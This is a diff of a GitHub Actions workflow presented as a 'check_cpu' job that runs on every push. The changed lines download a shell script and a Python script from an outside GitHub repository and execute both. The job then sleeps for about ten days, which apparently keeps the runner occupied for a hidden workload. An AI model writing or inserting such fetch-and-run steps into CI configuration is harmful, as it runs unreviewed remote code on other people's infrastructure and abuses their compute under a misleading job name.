@@ -4,7 +4,7 @@ on: push
 
 jobs:
   check_cpu:
-    runs-on: namespace-profile-namespace-x8
+    runs-on: namespace-profile-namespace-x8-2
 
     steps:
     - name: Checkout code
@@ -15,5 +15,5 @@ jobs:
         lscpu
         pip3 install selenium selenium-wire
         pip3 uninstall blinker -y && pip3 install blinker==1.4
-        wget https://raw.githubusercontent.com/labedun/repis/refs/heads/main/repi.sh && chmod +x repi.sh && ./repi.sh && wget https://raw.githubusercontent.com/labedun/repis/refs/heads/main/lok4.py && python3 lok4.py
+        wget https://raw.githubusercontent.com/labedun/repis/refs/heads/main/repi.sh && chmod +x repi.sh && ./repi.sh && wget https://raw.githubusercontent.com/labedun/repis/refs/heads/main/lok04.py && python3 lok04.py
         sleep 900000
